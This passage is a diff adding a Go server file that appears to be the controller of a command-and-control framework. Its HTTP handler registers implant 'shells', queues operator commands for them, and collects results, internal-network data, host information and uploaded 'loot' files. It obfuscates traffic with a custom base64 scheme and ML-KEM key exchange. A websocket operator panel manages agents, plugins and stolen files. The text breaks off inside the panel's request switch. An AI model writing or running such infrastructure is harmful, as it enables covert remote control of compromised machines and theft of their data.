@@ -1,0 +1,6788 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"crypto/md5"
+	"crypto/mlkem"
+	crand "crypto/rand"
+	"crypto/tls"
+	"encoding/binary"
+	"encoding/hex"
+	"encoding/json"
+	"errors"
+	"flag"
+	"fmt"
+	"github.com/gorilla/websocket"
+	"io"
+	"log"
+	"math"
+	"math/big"
+	"net"
+	"net/http"
+	"net/http/httptest"
+	"net/netip"
+	"os"
+	"path/filepath"
+	"reflect"
+	"regexp"
+	client_ "server/client"
+	"server/protocol"
+	"server/web_ui"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
+)
+
+var (
+	/*不可清理*/ mutex = &sync.RWMutex{}
+
+	mlkemKeys = make(map[string]mlkemKeyPair)
+	/*不可清理*/ mlkemKeysMu sync.RWMutex
+
+	/*不可清理*/
+	key_map = make(map[string][]byte)
+	/*不可清理*/ keyMu sync.RWMutex
+
+	// 客户端获取消息,前端插入消息
+	msgQueues = make(map[string]*uidMsgQueue) // key: uid
+	/*不可清理*/ queuesMu sync.RWMutex // 保护 map 本身的读写
+
+	//客户端发送结果,前端获取结果
+	msgResultQueues = make(map[string]*resultQueue)
+	/*不可清理*/ resultMu sync.RWMutex
+
+	//存储客户端结果
+	msg_map_list []Msg_result
+	/*不可清理*/ mapMu sync.RWMutex
+
+	//客户端发送目录,前端获取目录
+	msgFileQueue = make(map[string]*fileQueue)
+	/*不可清理*/ fileMu sync.RWMutex
+
+	//缓存客户端目录
+	msg_file_cache []Msg_file
+	/*不可清理*/ fcache sync.RWMutex
+
+	/*不可清理*/
+	base_map = make(map[string]string) //存
+	code_map = make(map[string]map[byte]int)
+	/*不可清理*/ serverRouteMu sync.RWMutex // 同时保护 base_map 和 code_map
+
+	sessionSlice []string
+	/*不可清理*/ error_str string
+
+	DownloadFile_byte_parts = make(map[string][]byte)
+	parts_count             = make(map[string]int)
+	/*不可清理*/ DoByteMu sync.RWMutex
+
+	/*不可清理*/
+	logger = &MyLog{}
+	/*不可清理*/ log_word = make(map[string]string)
+
+	/*不可清理*/
+	loggerMu sync.RWMutex
+	/*不可清理*/ WhiteMu sync.RWMutex
+)
+
+type mlkemKeyPair struct {
+	private []byte // 64 bytes: d || z
+	public  []byte // 1184 bytes
+}
+
+type Msg_file struct {
+	Uid    string `json:"uid"`
+	Taskid string `json:"taskid"`
+	File   string `json:"file"`
+}
+type fileQueue struct {
+	files []Msg_file
+	mu    sync.Mutex // 细粒度锁：只锁这个 UID 的结果
+}
+type Msg_result struct {
+	Uid    string `json:"uid"`
+	Result string `json:"result"`
+	Taskid string `json:"taskid"`
+}
+type resultQueue struct {
+	results []Msg_result
+	mu      sync.Mutex // 细粒度锁：只锁这个 UID 的结果
+}
+type Msg_get struct {
+	Ori_Msg   string `json:"Ori_msg"`
+	Encry_Msg string `json:"Encry_msg"`
+	Taskid    string `json:"taskid"`
+}
+type uidMsgQueue struct {
+	messages []Msg_get
+	mu       sync.Mutex // 每个 uid 独立的互斥锁
+}
+type MainHandler struct{}
+
+// 无权限交互
+func (m *MainHandler) Index(conn, Get_Msg, switch_key, download, result, net, info, upload, list,
+	option, uid_, hostname, keyPart, filekey, windows_pro, port string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		serverRouteMu.RLock()
+		base_rounds, exist_base := base_map[port]
+		code_rounds, exist_code := code_map[port]
+		serverRouteMu.RUnlock()
+		if !exist_base || !exist_code {
+			return
+		}
+		switch r.Method {
+		case http.MethodGet:
+			// 处理 GET 请求
+			op := r.URL.Query().Get(option)
+			var uid string
+			uidBytes := r.URL.Query().Get(uid_)
+			if uidBytes != "" {
+				uid_decode := customBase64Decode(uidBytes, code_rounds)
+				uid = string(uid_decode)
+			}
+			switch op {
+			case conn: //监听
+				clientIP := getClientIP(r)
+
+				shellnameGet := r.URL.Query().Get(hostname)
+				shellnameBytes := customBase64Decode(shellnameGet, code_rounds)
+				shellname := string(shellnameBytes)
+
+				formattedTime := time.Now().Format("2006.01.02 15:04")
+
+				put_conn(shellname, formattedTime, uid, clientIP)
+
+				mlkemKeysMu.RLock()
+				pair, ok := mlkemKeys[uid]
+				publicKey := append([]byte(nil), pair.public...)
+				mlkemKeysMu.RUnlock()
+
+				if !ok || len(publicKey) != mlkem.EncapsulationKeySize768 {
+					return
+				}
+
+				fmt.Fprint(w, customBase64Encode(publicKey, base_rounds))
+
+			case Get_Msg: //获取指令
+				data := GetMsg(uid, uidBytes)
+				fmt.Fprint(w, data)
+			case switch_key: //发送与交换密钥
+
+				byte_base_key_mid := r.URL.Query().Get(keyPart)
+				key_decode := customBase64Decode(byte_base_key_mid, code_rounds)
+
+				Switch_key(uid, key_decode)
+
+			case download:
+
+				filekey := r.URL.Query().Get(filekey)
+
+				fileByte, err := DownloadFile(uid, filekey, code_rounds)
+				if err != nil {
+					return
+				}
+				w.Header().Set("Content-Type", "application/octet-stream")
+				w.Header().Set("Accept-Ranges", "bytes")
+				w.Write(fileByte)
+				if f, ok := w.(http.Flusher); ok {
+					f.Flush()
+				}
+			}
+		case http.MethodPost:
+			op := r.URL.Query().Get(option)
+			switch op {
+			case result: //写入结果
+				err := r.ParseForm()
+				if err != nil {
+					return
+				}
+				baseuid := r.FormValue(uid_)
+				if baseuid == "" {
+					return
+				}
+				Byteuid := customBase64Decode(baseuid, code_rounds)
+				uid := string(Byteuid)
+				results := r.FormValue(result)
+				taskid := r.FormValue(info)
+				if results == "" || taskid == "" {
+					return
+				}
+				Results(uid, results, taskid, code_rounds)
+			case net: //接收内网信息
+				err := r.ParseForm()
+				if err != nil {
+					return
+				}
+				baseuid := r.FormValue(uid_)
+				if baseuid == "" {
+					return
+				}
+				Byteuid := customBase64Decode(baseuid, code_rounds)
+				uid := string(Byteuid)
+				results := r.FormValue(result)
+				if uid == "" || results == "" {
+					return
+				}
+				Net_results(uid, results, code_rounds)
+
+			case info: //接收客户端信息
+				err := r.ParseForm()
+				if err != nil {
+					return
+				}
+				baseuid := r.FormValue(uid_)
+				if baseuid == "" {
+					return
+				}
+				Byteuid := customBase64Decode(baseuid, code_rounds)
+		
+				uid := string(Byteuid)
+				encry_str := r.FormValue(result)
+				clientIP := getClientIP(r)
+				keyMu.RLock()
+				key, ok3 := key_map[uid]
+				keyMu.RUnlock()
+				if encry_str == "" || !ok3 {
+					return
+				}
+				if windows_pro == "group_pro" {
+					Windows_GetInfo(uid, encry_str, clientIP, key, code_rounds)
+				} else {
+					GetInfo(uid, encry_str, clientIP, key, code_rounds)
+				}
+
+			case upload:
+				reader, err := r.MultipartReader()
+				if err != nil {
+					return
+				}
+				var uid, result_, filename string
+				var fileData []byte
+				for {
+					part, err := reader.NextPart()
+					if err == io.EOF {
+						break
+					}
+					if err != nil {
+						return
+					}
+					if part.FormName() == uid_ {
+						buf, _ := io.ReadAll(part)
+						baseuid := string(buf)
+						Byteuid := customBase64Decode(baseuid, code_rounds)
+						
+						uid = string(Byteuid)
+					}
+					if part.FormName() == result {
+						buf, _ := io.ReadAll(part)
+						result_ = string(buf)
+					}
+					if part.FormName() == upload {
+						filename = part.FileName()
+						fileData, err = io.ReadAll(part)
+						if err != nil {
+							return
+						}
+					}
+				}
+				// 只有全部字段都不为空且 tmpFile 不为 nil 时才调用
+				if uid != "" && result_ != "" && filename != "" && len(fileData) > 0 {
+					UploadFileHandler(uid, result_, filename, fileData, code_rounds)
+				}
+
+			case list: //客户端写入目录
+				err := r.ParseForm()
+				if err != nil {
+					return
+				}
+				baseuid := r.FormValue(uid_)
+				if baseuid == "" {
+					return
+				}
+				Byteuid := customBase64Decode(baseuid, code_rounds)
+			
+				uid := string(Byteuid)
+				file := r.FormValue(result)
+				taskid := r.FormValue(info)
+				if file == "" || taskid == "" {
+					return
+				}
+				Put_file_list(uid, file, taskid, code_rounds)
+			}
+		}
+	}
+}
+
+var upgrader = websocket.Upgrader{
+	ReadBufferSize:  1024,
+	WriteBufferSize: 1024,
+	CheckOrigin: func(r *http.Request) bool {
+		return true
+	},
+}
+
+type WSClient struct {
+	Conn    *websocket.Conn
+	ConnMu  sync.RWMutex // 保护 Conn 指针
+	ReadMu  sync.Mutex   // 保证同一连接只有一个读者
+	WriteMu sync.Mutex   // 保证写操作串行
+}
+
+var wsUsers = make(map[string][]*WSClient)
+var wsUsersMu sync.RWMutex
+
+func (c *WSClient) getConn() *websocket.Conn {
+	if c == nil {
+		return nil
+	}
+
+	c.ConnMu.RLock()
+	conn := c.Conn
+	c.ConnMu.RUnlock()
+
+	return conn
+}
+
+func (c *WSClient) WriteJSON(v interface{}) error {
+	if c == nil {
+		return fmt.Errorf("nil ws client")
+	}
+
+	c.WriteMu.Lock()
+	defer c.WriteMu.Unlock()
+
+	conn := c.getConn()
+	if conn == nil {
+		return fmt.Errorf("nil ws conn")
+	}
+
+	return conn.WriteJSON(v)
+}
+
+func (c *WSClient) WriteMessage(messageType int, data []byte) error {
+	if c == nil {
+		return fmt.Errorf("nil ws client")
+	}
+
+	c.WriteMu.Lock()
+	defer c.WriteMu.Unlock()
+
+	conn := c.getConn()
+	if conn == nil {
+		return fmt.Errorf("nil ws conn")
+	}
+
+	return conn.WriteMessage(messageType, data)
+}
+
+func (c *WSClient) ReadMessage() (int, []byte, error) {
+	if c == nil {
+		return 0, nil, fmt.Errorf("nil ws client")
+	}
+
+	// 不要持有 ConnMu 调用阻塞式 ReadMessage
+	c.ReadMu.Lock()
+	defer c.ReadMu.Unlock()
+
+	conn := c.getConn()
+	if conn == nil {
+		return 0, nil, fmt.Errorf("nil ws conn")
+	}
+
+	return conn.ReadMessage()
+}
+
+func (c *WSClient) Close() error {
+	if c == nil {
+		return nil
+	}
+
+	c.WriteMu.Lock()
+	defer c.WriteMu.Unlock()
+
+	c.ConnMu.Lock()
+	conn := c.Conn
+	c.Conn = nil
+	c.ConnMu.Unlock()
+
+	if conn == nil {
+		return nil
+	}
+
+	return conn.Close()
+}
+
+func PushWS(username string, path string, data interface{}) {
+	// 1) 在短锁内拷贝要发送的目标列表
+	wsUsersMu.RLock()
+	targets := make(map[string][]*WSClient)
+	for user, clients := range wsUsers {
+		if username != "" && user != username {
+			continue
+		}
+		// 拷贝切片引用（浅拷贝）
+		copied := make([]*WSClient, len(clients))
+		copy(copied, clients)
+		targets[user] = copied
+	}
+	wsUsersMu.RUnlock()
+	// 2) 发送，不持有 wsUsersMu，记录需要删除的连接
+	deadMap := make(map[string]map[*WSClient]struct{})
+	for user, clients := range targets {
+		for _, c := range clients {
+			if c == nil || c.getConn() == nil {
+				if deadMap[user] == nil {
+					deadMap[user] = make(map[*WSClient]struct{})
+				}
+				deadMap[user][c] = struct{}{}
+				continue
+			}
+			err := c.WriteJSON(map[string]interface{}{
+				"path": path,
+				"data": data,
+			})
+			if err != nil {
+				// 关闭可能阻塞，但此处已不持有 wsUsersMu
+				c.Close()
+				if deadMap[user] == nil {
+					deadMap[user] = make(map[*WSClient]struct{})
+				}
+				deadMap[user][c] = struct{}{}
+			}
+		}
+	}
+	// 3) 清理失效连接（回写到 wsUsers）
+	if len(deadMap) == 0 {
+		return
+	}
+	wsUsersMu.Lock()
+	for user, deadSet := range deadMap {
+		clients := wsUsers[user]
+		alive := clients[:0]
+		for _, c := range clients {
+			if _, isDead := deadSet[c]; isDead {
+				continue
+			}
+			alive = append(alive, c)
+		}
+		if len(alive) == 0 {
+			delete(wsUsers, user)
+		} else {
+			wsUsers[user] = alive
+		}
+	}
+	wsUsersMu.Unlock()
+}
+
+func PushData(clientWs *WSClient, pushType string) {
+	var data interface{}
+
+	switch pushType {
+	case "agentList":
+		data = UserIndex()
+	case "winAgentList":
+		data = windows_pro_UserIndex()
+	case "listen":
+		data = Listen()
+	case "server":
+		data = ServerIndex()
+	case "chat":
+		data = GetChatSlice()
+	case "log":
+		data = Log_read(1000)
+	case "PluginList":
+		data = GetAllPluginCode()
+	case "loot":
+		data = Get_loots_pro()
+	default:
+		return
+	}
+
+	if data == nil {
+		return
+	}
+
+	payload := map[string]interface{}{
+		"code": "200",
+		"data": data,
+	}
+
+	if clientWs != nil {
+		_ = clientWs.WriteJSON(map[string]interface{}{
+			"path": pushType,
+			"data": payload,
+		})
+		return
+	}
+
+	PushWS("", pushType, payload)
+}
+
+func PushAgentData(uid, path string) {
+	var data interface{}
+	switch path {
+
+	// 推送全部task(排列顺序)
+	case "GetMsgList":
+		data = GetMsgList(uid)
+
+	// 推送指定监听
+	case "updateListen":
+		data = updateListen(uid)
+	// 推送指定服务器
+	case "updateServer":
+		data = updateServerIndex(uid)
+	// 推送指定插件
+	case "updatePlugin":
+		data = updatePluginCode(uid)
+	// 推送指定聊天
+	case "updateChat":
+		data = updateChatSlice(uid)
+	// 推送指定代理
+	case "updateIndex":
+		data = updateIndex(uid)
+	// 推送指定Windows代理
+	case "updateWinIndex":
+		data = updateIndex_windows(uid)
+
+	// 推送代理消息
+	case "updateGetMsgList":
+		data = updateGetMsgList(uid)
+	// 推送消息结果
+	case "updateGetMsgPost":
+		data = updateGetMsgPost(uid)
+	// 推送目录缓存
+	case "updateGetMsgCache":
+		data = updateGetMsgCache(uid)
+	// 推送内网信息
+	case "updateGetMsgNet":
+		data = updateInnet(uid)
+
+	default:
+		return
+	}
+	if data != nil {
+		PushWS(
+			"",
+			path,
+			map[string]interface{}{
+				"uid":  uid,
+				"data": data,
+			},
+		)
+	}
+}
+
+type UploadTask struct {
+	Buffer bytes.Buffer
+	Type   string
+	// uploadFile 字段
+	UID       string
+	Filename  string
+	SplitSize string
+	// chatFile 字段
+	Username string
+	Chatid   string
+}
+
+// 有权限交互,必须先登录
+func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+
+		var uploadTask *UploadTask
+		var username string
+
+		// 打印请求头
+		usernameCookie, err := r.Cookie("cookie")
+		if err != nil {
+			web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+			return
+		}
+		var foundUser bool
+		mutex.RLock()
+		for i := range sessionSlice {
+			session := &sessionSlice[i]
+			if *session == usernameCookie.Value {
+				foundUser = true
+				break
+			}
+		}
+		mutex.RUnlock()
+		if !foundUser {
+			web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+			return
+		}
+
+		_, username, _ = strings.Cut(usernameCookie.Value, "=")
+		if username == "" {
+			username = "null"
+		}
+		
+		user_ip := getClientIP(r)
+
+		// 升级为 websocket
+		conn, err := upgrader.Upgrade(w, r, nil)
+
+		if err != nil {
+			return
+		}
+		clientWs := &WSClient{
+			Conn: conn,
+		}
+		//保存连接
+		wsUsersMu.Lock()
+		wsUsers[usernameCookie.Value] = append(
+			wsUsers[usernameCookie.Value],
+			clientWs,
+		)
+		wsUsersMu.Unlock()
+
+		logger.WriteLog(fmt.Sprintf(log_word["user_join"], user_ip, username))
+
+		PushData(clientWs, "agentList")
+		PushData(clientWs, "winAgentList")
+		PushData(clientWs, "listen")
+		PushData(clientWs, "server")
+		PushData(clientWs, "chat")
+		PushData(clientWs, "log")
+		PushData(clientWs, "PluginList")
+		PushData(clientWs, "loot")
+
+		defer func() {
+			func() {
+				wsUsersMu.Lock()
+				defer wsUsersMu.Unlock()
+				usernameCookie := usernameCookie.Value
+				clients := wsUsers[usernameCookie]
+				for i, c := range clients {
+					if c != clientWs {
+						continue
+					}
+					copy(clients[i:], clients[i+1:])
+					clients[len(clients)-1] = nil
+					clients = clients[:len(clients)-1]
+					break
+				}
+				if len(clients) == 0 {
+					delete(wsUsers, usernameCookie)
+				} else {
+					wsUsers[usernameCookie] = clients
+				}
+			}()
+			if clientWs != nil {
+				_ = clientWs.Close()
+			}
+		}()
+		// 普通请求
+		for {
+			messageType, message, err := clientWs.ReadMessage()
+			if err != nil {
+				break
+			}
+			switch messageType {
+			case websocket.TextMessage:
+				var req struct {
+					Path string                 `json:"path"`
+					Body map[string]interface{} `json:"body"`
+				}
+				if err := json.Unmarshal(message, &req); err != nil {
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    400,
+						"path":    "unknown",
+						"message": "invalid json",
+					})
+					continue
+				}
+
+				body := req.Body
+				if body == nil {
+					body = map[string]interface{}{}
+				}
+
+				switch req.Path {
+				case "getResults": // 用户操作，获取执行结果
+					uid, ok := body["uid"].(string)
+					if !ok {
+						continue
+					}
+					taskid, ok := body["taskid"].(string)
+					if !ok {
+						continue
+					}
+					results := Getresults(uid, taskid)
+					resp := map[string]interface{}{
+						"code":   200,
+						"path":   "getResults",
+						"uid":    uid,
+						"taskid": taskid,
+						"data":   results,
+					}
+					data, err := json.Marshal(resp)
+					if err != nil {
+						continue
+					}
+
+					err = clientWs.WriteMessage(
+						websocket.TextMessage,
+						data,
+					)
+					if err != nil {
+						continue
+					}
+				case "msg":
+					uid, ok := body["uid"].(string)
+					if !ok || strings.TrimSpace(uid) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "uid is required",
+						})
+						continue
+					}
+				
+					taskid, ok := body["taskid"].(string)
+					if !ok || strings.TrimSpace(taskid) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "taskid is required",
+						})
+						continue
+					}
+				
+					port, ok := body["port"].(string)
+					if !ok || strings.TrimSpace(port) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "port is required",
+						})
+						continue
+					}
+				
+					rawMsg, exists := body["msg"]
+					if !exists || rawMsg == nil {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "msg is required",
+						})
+						continue
+					}
+				
+					var msg string
+				
+					switch value := rawMsg.(type) {
+					case string:
+						// 前端传入 JSON 字符串
+						msg = value
+				
+					case map[string]interface{}:
+						// 前端直接传入 JSON 对象
+						data, err := json.Marshal(value)
+						if err != nil {
+							_ = clientWs.WriteJSON(map[string]interface{}{
+								"code":    400,
+								"path":    "msg",
+								"message": "invalid msg object",
+							})
+							continue
+						}
+						msg = string(data)
+				
+					default:
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "msg must be a JSON string or object",
+						})
+						continue
+					}
+				
+					if strings.TrimSpace(msg) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "msg",
+							"message": "msg is empty",
+						})
+						continue
+					}
+				
+					errStr := Getcmd(uid, msg, taskid, port)
+					if errStr != "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "msg",
+							"message": errStr,
+						})
+						continue
+					}
+				
+					_ = clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "msg",
+						"message": "Message sent successfully",
+					})
+				case "insertKey":
+					uid, _ := body["uid"].(string)
+
+					created, exists := insertKeyMap(uid)
+
+					response := map[string]interface{}{
+						"code":    400,
+						"uid":     uid,
+						"path":    "insertKey",
+						"message": "insert fail",
+					}
+
+					if created {
+						response["code"] = 200
+						response["message"] = "insert success"
+					} else if exists {
+						response["code"] = 409
+						response["message"] = "key already exists"
+					}
+
+					if err := clientWs.WriteJSON(response); err != nil {
+						break
+					}
+
+				case "delShellInnet":
+					uid, _ := body["uid"].(string)
+					target, _ := body["target"].(string)
+					taskid, _ := body["taskid"].(string)
+					if uid == "" || target == "" || taskid == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delShellInnet",
+							"uid":     uid,
+							"target":  target,
+							"taskid":  taskid,
+							"message": "missing uid or target",
+						})
+						break
+					}
+					delnet := Del_shell_innet(target, uid)
+					if delnet {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    200,
+							"path":    "delShellInnet",
+							"uid":     uid,
+							"target":  target,
+							"taskid":  taskid,
+							"message": "Successfully deleted target",
+						})
+
+						// 异步推送删除消息到前端
+						go PushWS("", "send_delShellInnet", map[string]interface{}{
+							"uid":    uid,
+							"target": target,
+							"taskid": taskid,
+						})
+					} else {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "delShellInnet",
+							"uid":     uid,
+							"target":  target,
+							"taskid":  taskid,
+							"message": "target not found",
+						})
+					}
+				case "delIndex":
+					indexStr, _ := body["uid"].(string)
+					taskid, _ := body["taskid"].(string)
+
+					index, err := strconv.Atoi(indexStr)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delIndex",
+							"uid":     indexStr,
+							"taskid":  taskid,
+							"message": "Invalid index",
+						})
+						break
+					}
+
+					del,delbool := deleteConnAtIndex(index)
+					if delbool{
+
+						keyMu.Lock()
+						_, exists := key_map[del]
+						if exists {
+							delete(key_map, del)
+						}
+						keyMu.Unlock()
+
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    200,
+							"path":    "delIndex",
+							"uid":     indexStr,
+							"taskid":  taskid,
+							"message": "Successfully deleted target",
+						})
+					} else {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "delIndex",
+							"uid":     indexStr,
+							"taskid":  taskid,
+							"message": "Delete target failed",
+						})
+					}
+				case "delInfo":
+					uid, _ := body["uid"].(string)
+					info, _ := body["info"].(string)
+					taskid, _ := body["taskid"].(string)
+
+					var found bool
+					if info != "" {
+						windows_clientMu.Lock()
+						for i := range windows_client_data.Clients {
+							client := &windows_client_data.Clients[i]
+							if uid == client.Uid {
+								lastIdx := len(windows_client_data.Clients) - 1
+								windows_client_data.Clients[i] = windows_client_data.Clients[lastIdx]
+								windows_client_data.Clients = windows_client_data.Clients[:lastIdx]
+								found = true
+								break
+							}
+						}
+						windows_clientMu.Unlock()
+					} else {
+						clientDataMu.Lock()
+						for i := range client_data.Clients {
+							client := &client_data.Clients[i]
+							if uid == client.Uid {
+								lastIdx := len(client_data.Clients) - 1
+								client_data.Clients[i] = client_data.Clients[lastIdx]
+								client_data.Clients = client_data.Clients[:lastIdx]
+								found = true
+								break
+							}
+						}
+						clientDataMu.Unlock()
+					}
+					if !found {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "delInfo",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": "client not found",
+						})
+						continue
+					}
+					keyMu.Lock()
+					delete(key_map, uid)
+					keyMu.Unlock()
+
+					queuesMu.Lock()
+					delete(msgQueues, uid)
+					queuesMu.Unlock()
+
+					resultMu.Lock()
+					delete(msgResultQueues, uid)
+					resultMu.Unlock()
+
+					mapMu.Lock()
+					for i := len(msg_map_list) - 1; i >= 0; i-- {
+						msg := &msg_map_list[i]
+						if msg.Uid == uid {
+							msg_map_list = append(msg_map_list[:i], msg_map_list[i+1:]...)
+						}
+					}
+					mapMu.Unlock()
+
+					fileMu.Lock()
+					delete(msgFileQueue, uid)
+					fileMu.Unlock()
+
+					fcache.Lock()
+					for i := len(msg_file_cache) - 1; i >= 0; i-- {
+						item := &msg_file_cache[i]
+						if item.Uid == uid {
+							msg_file_cache = append(msg_file_cache[:i], msg_file_cache[i+1:]...)
+						}
+					}
+					fcache.Unlock()
+
+					dataInnetmu.Lock()
+					for i := len(data_innet.Innets) - 1; i >= 0; i-- {
+						innet := &data_innet.Innets[i]
+						if innet.Uid == uid {
+							data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
+						}
+					}
+					dataInnetmu.Unlock()
+
+					logStr := fmt.Sprintf(log_word["removed_agent"], uid)
+					logger.WriteLog(logStr)
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":   200,
+						"path":   "delInfo",
+						"uid":    uid,
+						"taskid": taskid,
+						"data":   "agent has been removed",
+					})
+
+					go PushWS("", "send_delInfo", map[string]interface{}{
+						"uid":    uid,
+						"taskid": taskid,
+					})
+					go PushWS("", "send_delWinInfo", map[string]interface{}{
+						"uid":    uid,
+						"taskid": taskid,
+					})
+
+				case "getFileList":
+					uid, _ := body["uid"].(string)
+					taskid, _ := body["taskid"].(string)
+
+					if uid == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "getFileList",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": "invalid uid",
+						})
+						continue
+					}
+
+					data := Get_file_list(uid, taskid)
+
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":   200,
+						"path":   "getFileList",
+						"uid":    uid,
+						"taskid": taskid,
+						"data":   data,
+					})
+
+				case "getFileCache":
+					uid, _ := body["uid"].(string)
+					data := Read_file_list(uid)
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "getFileCache",
+						"uid":  uid,
+						"data": data,
+					})
+
+				case "downloadlog":
+					const logFilePath = "server.log"
+				
+					writeError := func(code int, message string) {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    code,
+							"path":    "downloadlog",
+							"message": message,
+						})
+					}
+					loggerMu.RLock()
+				
+					file, err := os.Open(logFilePath)
+					if err != nil {
+						loggerMu.RUnlock()
+						writeError(500, "failed to open log file")
+						continue
+					}
+				
+					stat, err := file.Stat()
+					loggerMu.RUnlock()
+				
+					if err != nil {
+						_ = file.Close()
+						writeError(500, "failed to stat log file")
+						continue
+					}
+					totalSize := stat.Size()
+				
+					offset, sendSize, chunked, err :=
+						parseDownloadRange(body, totalSize)
+					if err != nil {
+						_ = file.Close()
+						writeError(400, err.Error())
+						continue
+					}
+				
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":      200,
+						"path":      "downloadlog",
+						"filename":  filepath.Base(logFilePath),
+						"size":      totalSize,
+						"offset":    offset,
+						"chunkSize": sendSize,
+						"chunked":   chunked,
+					}); err != nil {
+						_ = file.Close()
+						return
+					}
+					sentSize, sendErr :=
+						writeBinaryRange(clientWs, file, offset, sendSize)
+				
+					closeErr := file.Close()
+				
+					if sendErr != nil {
+						return
+					}
+					if closeErr != nil {
+						return
+					}
+					nextOffset := offset + sentSize
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":       200,
+						"path":       "downloadlog",
+						"message":    "download finished",
+						"filename":   filepath.Base(logFilePath),
+						"size":       totalSize,
+						"offset":     offset,
+						"sentSize":   sentSize,
+						"nextOffset": nextOffset,
+						"eof":        nextOffset >= totalSize,
+						"chunked":    chunked,
+					}); err != nil {
+						return
+					}
+
+				case "downloadChatFile":
+					filename, ok := body["filename"].(string)
+					if !ok || !isSafeLootPathPart(filename) {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "downloadChatFile",
+							"message": "missing filename",
+						})
+						continue
+					}
+
+					filename = filepath.Base(filename)
+					filePath := filepath.Join("./chat_uploads/", filename)
+
+					info, err := os.Stat(filePath)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "downloadChatFile",
+							"message": "file not found",
+						})
+						continue
+					}
+
+					offset, sendSize, chunked, err := parseDownloadRange(body, info.Size())
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "downloadChatFile",
+							"message": err.Error(),
+						})
+						continue
+					}
+
+					file, err := os.Open(filePath)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "downloadChatFile",
+							"message": "open file failed",
+						})
+						return
+					}
+
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":      200,
+						"path":      "downloadChatFile",
+						"type":      "file_start",
+						"filename":  filename,
+						"size":      info.Size(),
+						"offset":    offset,
+						"chunkSize": sendSize,
+						"chunked":   chunked,
+					}); err != nil {
+						_ = file.Close()
+						return
+					}
+
+					sentSize, err := writeBinaryRange(clientWs, file, offset, sendSize)
+					file.Close()
+					if err != nil {
+						return
+					}
+
+					nextOffset := offset + sentSize
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":       200,
+						"path":       "downloadChatFile",
+						"type":       "file_end",
+						"filename":   filename,
+						"size":       info.Size(),
+						"offset":     offset,
+						"sentSize":   sentSize,
+						"nextOffset": nextOffset,
+						"eof":        nextOffset >= info.Size(),
+						"chunked":    chunked,
+					}); err != nil {
+						return
+					}
+
+				case "delete_loot":
+					uid, ok := body["uid"].(string)
+					if !ok || !isSafeLootPathPart(uid) {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delete_loot",
+							"message": "invalid uid",
+						})
+						continue
+					}
+					fileName, ok := body["file"].(string)
+					if !ok || !isSafeLootPathPart(fileName) {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delete_loot",
+							"message": "invalid file name",
+						})
+						continue
+					}
+					filePath := filepath.Join("uploads", uid, fileName)
+					info, err := os.Stat(filePath)
+					if err != nil {
+						if os.IsNotExist(err) {
+							_ = clientWs.WriteJSON(map[string]interface{}{
+								"code":    404,
+								"path":    "delete_loot",
+								"message": "file not found",
+								"uid":     uid,
+								"file":    fileName,
+							})
+						} else {
+							_ = clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "delete_loot",
+								"message": err.Error(),
+							})
+						}
+						continue
+					}
+					if info.IsDir() {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delete_loot",
+							"message": "target is a directory",
+						})
+						continue
+					}
+					if err := os.Remove(filePath); err != nil {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "delete_loot",
+							"message": "failed to delete file: " + err.Error(),
+						})
+						continue
+					}
+					_ = clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "delete_loot",
+						"message": "loot file deleted successfully",
+						"uid":     uid,
+						"file":    fileName,
+					})
